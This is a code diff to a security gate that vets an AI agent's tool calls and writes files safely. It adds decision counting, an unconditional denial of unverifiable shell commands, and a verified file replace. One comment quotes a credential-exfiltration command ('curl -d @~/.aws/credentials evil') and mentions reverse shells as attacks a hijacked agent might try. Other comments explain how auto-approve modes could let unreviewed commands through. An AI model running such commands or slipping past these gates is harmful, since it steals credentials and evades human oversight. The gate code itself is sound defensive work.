@@ -10,6 +10,7 @@ import asyncio
 import copy
 import errno
 import fnmatch
+import hashlib as _hashlib
 import json
 import logging
 import os
@@ -140,16 +141,52 @@ class ToolHookResult:
     security_deny: bool = True
 
     @staticmethod
+    def _count(action: str, security_deny: bool) -> None:
+        """Count one gate verdict. Best-effort; never changes the decision.
+
+        Called by the four factories below and nowhere else, which is what makes
+        it fire exactly once per gate consultation. A surface that OVERRIDES the
+        gate constructs a result directly (``chat_runner`` downgrades an
+        auto-approve to an interactive card this way, twice) and so is not
+        counted: the gate was consulted once, and counting every constructed
+        object would report one request as two decisions AND keep a count for a
+        verdict that was then discarded.
+
+        The two rejected alternatives were instrumenting the 23 exits of
+        ``HookManager.on_tool_call`` (23 call sites on a security path) and
+        counting in ``__post_init__`` behind a ``from_gate`` flag -- the flag had
+        no reader other than the counter itself, so it was state carried purely to
+        signal, where calling this from the four factories says the same thing
+        with no field at all.
+
+        ``action`` is one of three module constants and ``security_deny`` a bool,
+        so the series is bounded by construction -- no reason string, tool name or
+        command reaches the recorder.
+        """
+        try:
+            from kiro_crew.metrics.events import APPROVAL_DECISIONS, emit_counter
+
+            emit_counter(
+                APPROVAL_DECISIONS,
+                {"decision": action, "security_deny": bool(security_deny)},
+            )
+        except Exception:  # a tool decision must never fail on its telemetry
+            logger.debug("approval decision counter failed", exc_info=True)
+
+    @staticmethod
     def allow() -> ToolHookResult:
+        ToolHookResult._count(TOOL_ALLOW, False)
         return ToolHookResult(action=TOOL_ALLOW)
 
     @staticmethod
     def auto_approve() -> ToolHookResult:
+        ToolHookResult._count(TOOL_AUTO_APPROVE, False)
         return ToolHookResult(action=TOOL_AUTO_APPROVE)
 
     @staticmethod
     def deny(reason: str) -> ToolHookResult:
         """Deny on a hard security check — the attempt is the problem."""
+        ToolHookResult._count(TOOL_DENY, True)
         return ToolHookResult(action=TOOL_DENY, reason=reason, security_deny=True)
 
     @staticmethod
@@ -160,6 +197,7 @@ class ToolHookResult:
         durable budget (cron auto-pause) does not treat a governance ceiling as
         a defect in what it attempted.
         """
+        ToolHookResult._count(TOOL_DENY, False)
         return ToolHookResult(action=TOOL_DENY, reason=reason, security_deny=False)
 
 
@@ -617,6 +655,25 @@ class HookManager:
         # Deny-by-default: a shell tool whose command could not be recovered
         # must not be evaluated on the untrusted title alone — that is the very
         # bypass this gate closes. Reject instead of falling through.
+        #
+        # This refusal is UNCONDITIONAL, and deliberately has no operator override.
+        # An override was implemented and removed on this PR: ``ToolHookResult``
+        # carries only ``allow`` / ``auto_approve`` / ``deny``, so a suppressed call
+        # can at best return ``allow``, and ``allow`` falls through to
+        # patterns / trust-reads / trust / YOLO / interactive in the dashboard
+        # runner. Under YOLO — or a trust grant, or native-crew auto-approve — the
+        # unverified command would then execute with no human ever seeing it, which
+        # is precisely what this gate exists to prevent, in exactly the
+        # configuration an operator who wants the convenience is likeliest to run.
+        # Barring the hook-level auto-approve branches is NOT sufficient, because
+        # the decision is re-made downstream.
+        #
+        # The false-positive that motivated the override (a provider payload shape
+        # this build does not recognize yields no command even for an ordinary
+        # call — see ``AcpEvent.shell_command``) is real, but the fix belongs in
+        # recognizing the payload shape, not in admitting commands no gate read.
+        # Making this suppressible would need a fourth action meaning "force the
+        # interactive prompt, and let no downstream tier auto-grant it".
         if is_shell and not command:
             return ToolHookResult.deny(
                 "Blocked: shell command could not be verified for security "
@@ -648,11 +705,27 @@ class HookManager:
         # as a path: a real file-read title ("~/.aws/credentials") matches,
         # while a bash command ("cat ~/.aws/credentials") resolves to a
         # non-sensitive path and is instead caught by is_sensitive_bash_command.
+        # The always-on gates below are keyed by rule id, so resolve the effective
+        # regex set to ids ONCE here and thread it in. ``None`` means all enabled,
+        # which is what the callers outside this gate (cron command vetting,
+        # computer-use input vetting) keep passing.
+        #
+        # ONE context snapshot for the WHOLE gate, reused by the catalog checks
+        # further down. Reading ``current_context()`` twice let a live ceiling
+        # refresh land between the reads, so a single tool call could be judged
+        # half under the old ceiling and half under the new one. The direction
+        # that matters: the structural IMDS/exfil checks here are the only ones
+        # that catch an ENCODED address (``credential-exfil-imds-any`` exists
+        # precisely because the curl/wget patterns match a literal dotted quad),
+        # so a governance pin arriving after this line could never be applied to
+        # the encoded form — honouring a pin late is not honouring it.
+        ctx = current_context()
+        enabled_ids = security.enabled_rule_ids(self._effective_denied(ctx))
         for target in security_targets:
             if is_sensitive_path(target):
                 return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
             # execute_bash (prefixed or bare) — check for reads of sensitive paths.
-            reason = is_sensitive_bash_command(target)
+            reason = is_sensitive_bash_command(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
             # Data-exfiltration / reverse-shell command shapes.
@@ -661,7 +734,7 @@ class HookManager:
             # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
             # evil` or open a reverse shell unblocked. Deny them at the gate —
             # against the raw command too, not just the title.
-            reason = audit_bash_exfiltration(target)
+            reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
         # The display title is backend-variable and may NOT carry the path (an
@@ -731,7 +804,9 @@ class HookManager:
         # the overlay patterns appended; security.is_denied never calls back).
         # Check the raw command (ground truth) as well as the normalized and
         # original title forms.
-        ctx = current_context()
+        # Reuses the ONE snapshot taken at the top of the gate — see the comment
+        # there. A second read here would let a ceiling refresh split this call's
+        # verdict across two policy states.
         authority = ctx.security
         denied_regexes = self._effective_denied(ctx)
         denied_notes = self._denied_notes()
@@ -962,6 +1037,11 @@ class HookManager:
         # Auto-approve — match against both the original title (preserves
         # "Running: "/"Reading " prefixes) and the normalized name (stripped)
         # so that "Running: *" and bare tool-name patterns both work.
+        #
+        # This loop matches only the TITLE, which the agent authors — safe here
+        # ONLY because a shell call whose command could not be recovered was
+        # already hard-denied above, so no unverified command can reach it. Do not
+        # weaken that refusal without also gating this loop.
         for pattern in self._config.auto_approve_tools:
             if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                 return ToolHookResult.auto_approve()
@@ -1170,7 +1250,7 @@ def resolve_effective_denied_regexes(
     later loosening reverses) or a rule the user is enforcing themselves.
     """
     return security.compute_effective_denied(
-        security.BUILTIN_DENIED_RULES,
+        list(security.BUILTIN_DENIED_RULES) + security.edition_denied_rules(),
         config.denied_commands_disabled_ids,
         config.denied_commands_disable_all,
         [p.pattern for p in config.denied_commands_user_added if p.enabled],
@@ -2253,12 +2333,31 @@ def safe_read_file_bytes_nolink(
                 pass
 
 
-def safe_write_file_nolink(
+def _pinned_replace(
     raw: str,
     content: str,
     within_root: str | None = None,
-) -> bool:
+    base_hash: str | None = None,
+    max_bytes: int | None = None,
+) -> str:
     """Overwrite an EXISTING regular file, pinned to the descriptor opened.
+
+    The engine behind :func:`safe_write_file_nolink` (no verification) and
+    :func:`verified_replace_file_nolink` (compare-and-swap). Returns an
+    outcome string: ``"ok"``, ``"refused"``, and — only when *base_hash* is
+    given — ``"conflict"`` (the file's bytes or identity no longer match the
+    edit base) or ``"too_large"`` (the file outgrew *max_bytes* since the
+    base was read, which by definition is not the state the edit was made
+    against).
+
+    When *base_hash* is given, the sha256 of the CURRENT bytes is computed by
+    reading the SAME descriptor every other check runs against — one
+    ``O_NOFOLLOW`` open, one name resolution, so no by-name re-read can be
+    redirected between the verify and the replace. The residual is the data
+    race between that read and the rename; it is narrowed twice below (the
+    staged-rename identity re-check, and the mtime/size re-check in verify
+    mode) and a detected change answers ``"conflict"`` — the newer file wins,
+    never the stale edit.
 
     The write twin of :func:`safe_read_file_bytes_nolink`, and it exists for the
     same reason: validating a path by name and then opening it by name leaves a
@@ -2276,20 +2375,28 @@ def safe_write_file_nolink(
     land via an atomic replace (staged sibling + directory-fd-relative rename),
     so a write that fails partway leaves the original untouched instead of a
     truncated file.
-
-    Returns True when the bytes were written, False on any rejection.
     """
     path = validate_file_path(raw)
     if path is None:
-        return False
+        return "refused"
     encoded = content.encode("utf-8")
     try:
         # O_RDWR, not O_WRONLY: the no-dir-fd path below needs to READ the
         # original bytes before truncating so it can put them back if the write
         # fails. Same inode checks either way.
-        fd = os.open(path, os.O_RDWR | getattr(os, "O_NOFOLLOW", 0))
+        #
+        # O_BINARY is REQUIRED on Windows, where os.open defaults to TEXT mode
+        # and os.write then expands every \n to \r\n — so a caller handing this
+        # writer exact bytes got a longer file back, and a body just under a
+        # size cap lands as a file over it. Absent on POSIX, where getattr
+        # yields 0 and there is no text mode to opt out of. Same convention as
+        # dashboard/token_secret.py and dashboard/handlers/files.py.
+        fd = os.open(
+            path,
+            os.O_RDWR | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_BINARY", 0),
+        )
     except OSError:
-        return False
+        return "refused"
     # The descriptor must survive validation (the no-dir-fd path below writes
     # THROUGH it), so it cannot be closed in a blanket `finally`. Validation
     # therefore runs in a nested function: every rejection is a single return
@@ -2343,8 +2450,54 @@ def safe_write_file_nolink(
             os.close(fd)
         except OSError:
             pass
-        return False
+        return "refused"
     src_mode, src_ident = validated
+    src_state: tuple[int, int] | None = None
+
+    if base_hash is not None:
+        # COMPARE half of the compare-and-swap, on the descriptor itself. The
+        # bytes hashed here are the bytes of the inode every later check pins,
+        # not a second by-name lookup that an ancestor or leaf swap could
+        # redirect. Bounded: a file that outgrew the caller's cap since the
+        # edit base was read cannot match that base.
+        try:
+            chunks: list[bytes] = []
+            seen = 0
+            while True:
+                chunk = os.read(fd, 65536)
+                if not chunk:
+                    break
+                seen += len(chunk)
+                if max_bytes is not None and seen > max_bytes:
+                    # Guarded close, then return: an unguarded close that
+                    # raises would fall into the outer except, close the
+                    # already-released fd number a second time, and rewrite
+                    # this outcome as "refused".
+                    try:
+                        os.close(fd)
+                    except OSError:
+                        pass
+                    return "too_large"
+                chunks.append(chunk)
+            if _hashlib.sha256(b"".join(chunks)).hexdigest() != base_hash:
+                try:
+                    os.close(fd)
+                except OSError:
+                    pass
+                return "conflict"
+            # Freshness reference for the pre-rename re-check, captured
+            # from the descriptor AFTER the bytes were read: the window
+            # it guards is read-to-rename, so a touch landing before the
+            # read (or a byte-identical rewrite, already covered by the
+            # hash) cannot false-positive it.
+            st_after = os.fstat(fd)
+            src_state = (st_after.st_mtime_ns, st_after.st_size)
+        except OSError:
+            try:
+                os.close(fd)
+            except OSError:
+                pass
+            return "refused"
 
     # From here on the descriptor stays OPEN. It is the only handle proven to
     # point at the validated inode, and the no-dir-fd path below writes through
@@ -2431,7 +2584,7 @@ def safe_write_file_nolink(
                     os.close(fd)
                 except OSError:
                     pass
-                return False
+                return "refused"
             src_xattrs = []
 
     # POSIX: the descriptor's job is done -- the staged rename below is pinned by
@@ -2448,18 +2601,18 @@ def safe_write_file_nolink(
             try:
                 dfd = os.open(parent, os.O_RDONLY | o_directory | getattr(os, "O_NOFOLLOW", 0))
             except OSError:
-                return False
+                return "refused"
         if use_dir_fd and within_root is not None:
             dir_real = _fd_real_path(dfd)
             if dir_real is None:
-                return False  # cannot verify containment -> fail closed
+                return "refused"  # cannot verify containment -> fail closed
             root_real = os.path.realpath(within_root)
             try:
                 contained = os.path.commonpath([dir_real, root_real]) == root_real
             except ValueError:
                 contained = False
             if not contained or is_sensitive_path(dir_real):
-                return False
+                return "refused"
         elif within_root is not None:
             # No directory handle to interrogate, so the parent is verified by
             # its resolved path. Weaker than the pinned check (a swap between
@@ -2472,7 +2625,7 @@ def safe_write_file_nolink(
             except ValueError:
                 contained = False
             if not contained or is_sensitive_path(dir_real):
-                return False
+                return "refused"
         # O_NOFOLLOW guards only the FINAL component, so opening the parent by
         # name leaves an INTERMEDIATE ancestor swappable between the file's
         # validation and this open: /project/a/c/doc with `a` replaced by a
@@ -2485,24 +2638,37 @@ def safe_write_file_nolink(
             try:
                 dst = os.stat(base, dir_fd=dfd, follow_symlinks=False)
             except OSError:
-                return False
+                return "refused"
             if (dst.st_dev, dst.st_ino) != src_ident:
                 logger.warning(
                     "refusing source write to %r: the pinned parent no longer resolves to "
                     "the validated file",
                     path,
                 )
-                return False
+                # "refused" in BOTH modes: this predicate is the ancestor-swap
+                # security guard (see the comment above), and auditing a
+                # hostile swap under the benign concurrent-save code would
+                # blind the SEL trail. The two post-staging re-checks below
+                # own the benign-concurrency vocabulary.
+                return "refused"
             tfd = os.open(
                 tmp_name,
-                os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0),
+                os.O_WRONLY
+                | os.O_CREAT
+                | os.O_EXCL
+                | getattr(os, "O_NOFOLLOW", 0)
+                | getattr(os, "O_BINARY", 0),
                 0o600,
                 dir_fd=dfd,
             )
         else:
             tfd = os.open(
                 os.path.join(parent, tmp_name),
-                os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0),
+                os.O_WRONLY
+                | os.O_CREAT
+                | os.O_EXCL
+                | getattr(os, "O_NOFOLLOW", 0)
+                | getattr(os, "O_BINARY", 0),
                 0o600,
             )
         created = True
@@ -2550,7 +2716,7 @@ def safe_write_file_nolink(
                             path,
                             attr,
                         )
-                        return False
+                        return "refused"
                     continue  # informational attribute -- keep going
             os.fsync(tfd)
         finally:
@@ -2578,14 +2744,26 @@ def safe_write_file_nolink(
                 else os.stat(path, follow_symlinks=False)
             )
         except OSError:
-            return False
+            return "refused"
         if (pre.st_dev, pre.st_ino) != src_ident:
             logger.warning(
                 "refusing source write to %r: the file changed on disk after validation "
                 "(concurrent save); not overwriting the newer content",
                 path,
             )
-            return False
+            return "conflict" if base_hash is not None else "refused"
+        if src_state is not None and (pre.st_mtime_ns, pre.st_size) != src_state:
+            # Same inode, different content: an IN-PLACE write landed after the
+            # descriptor-anchored verify. The identity check above cannot see
+            # it, but a changed mtime or size can — a narrowing on filesystems
+            # with coarse timestamps, never a widening, and the failure
+            # direction is the safe one: the newer file wins.
+            logger.warning(
+                "refusing verified replace of %r: the file was rewritten in place "
+                "after its base hash was verified (concurrent save)",
+                path,
+            )
+            return "conflict"
         if use_dir_fd:
             os.rename(tmp_name, base, src_dir_fd=dfd, dst_dir_fd=dfd)
         else:
@@ -2594,9 +2772,9 @@ def safe_write_file_nolink(
             # which is the property that matters here.
             os.replace(os.path.join(parent, tmp_name), path)
         created = False  # renamed away; nothing left to clean up
-        return True
+        return "ok"
     except OSError:
-        return False
+        return "refused"
     finally:
         if created:
             try:
@@ -2611,6 +2789,53 @@ def safe_write_file_nolink(
                 os.close(dfd)
             except OSError:
                 pass
+
+
+def safe_write_file_nolink(
+    raw: str,
+    content: str,
+    within_root: str | None = None,
+) -> bool:
+    """Overwrite an EXISTING regular file, pinned to the descriptor opened.
+
+    The no-verification entry point of :func:`_pinned_replace`; see there for
+    the full contract. Returns True when the bytes were written, False on any
+    rejection.
+    """
+    return _pinned_replace(raw, content, within_root=within_root) == "ok"
+
+
+def verified_replace_file_nolink(
+    raw: str,
+    content: str,
+    base_hash: str,
+    *,
+    max_bytes: int,
+    within_root: str | None = None,
+) -> str:
+    """Compare-and-swap replace: verify *base_hash*, then atomically install.
+
+    One ``O_NOFOLLOW`` open anchors everything — validation, the sha256 of the
+    current bytes, metadata capture, and (via the pinned directory descriptor)
+    the staged rename — so verification and replacement share one name
+    resolution instead of a by-name read followed by an independent by-name
+    write. Concurrency changes detected at any point after verification
+    (identity swap, or an in-place rewrite visible through mtime/size) answer
+    ``"conflict"`` rather than overwriting: the newer file wins, never the
+    stale edit. Returns ``"ok"``, ``"conflict"``, ``"too_large"`` (the file
+    outgrew *max_bytes* since the base was read), or ``"refused"``.
+    """
+    # Deny-by-default (AUTOSDE backend-security-controls): a verifying
+    # primitive that accepts an unverifiable base and proceeds anyway has the
+    # wrong contract regardless of caller. An explicit check, not an assert —
+    # asserts vanish under ``python -O``, and the falsy value would silently
+    # SKIP verification rather than refuse (fail-open, the exact lost-update
+    # class this primitive exists to close).
+    if not isinstance(base_hash, str) or not re.fullmatch(r"[0-9a-f]{64}", base_hash):
+        return "refused"
+    return _pinned_replace(
+        raw, content, within_root=within_root, base_hash=base_hash, max_bytes=max_bytes
+    )
 
 
 def safe_copy_file_nolink(raw: str, dest_dir: str) -> str | None:
@@ -3019,6 +3244,23 @@ _AUDIT_ONLY_READ_IDS: dict[str, str] = {
     # ``status.reconcile_connected_since`` for why that boundary is
     # best-effort rather than fail-closed (stats only, no bytes returned).
     "connections_status.oauth_grant_presence": ".aws/sso/cache/<sha256(mcp_url)>.token.json",
+    # Class 2, same artifacts and same posture again: the premint endpoint
+    # (``dashboard.handlers.connections.api_connections_premint``) reaches the warm
+    # engine's candidate scan, which STATS the paired grant artifacts for every
+    # registry provider to decide which ones still need a URL minted.
+    #
+    # A separate id from the mint's and the status module's, so the trail names the
+    # surface that looked. ONE event per activation rather than one per candidate:
+    # the scan is a single pass whose N answers feed exactly one act decision (spawn
+    # the shared warm process, or do not), so per-candidate events would over-count
+    # one observation and, because this entry point marks its events critical, drain
+    # the queue N times for a single page mount. Audited only when the endpoint ACTS
+    # -- an empty candidate set returns early without spawning, persisting, or
+    # reporting any grant answer, so a page mounted against a fully-authorized
+    # gallery writes nothing. Best-effort rather than fail-closed for the same reason
+    # as the two entries above (stats only, no bytes returned); see
+    # ``api_connections_premint`` for why refusing would be the worse failure.
+    "connections_premint.oauth_grant_presence": ".aws/sso/cache/<sha256(mcp_url)>.token.json",
 }
 
 
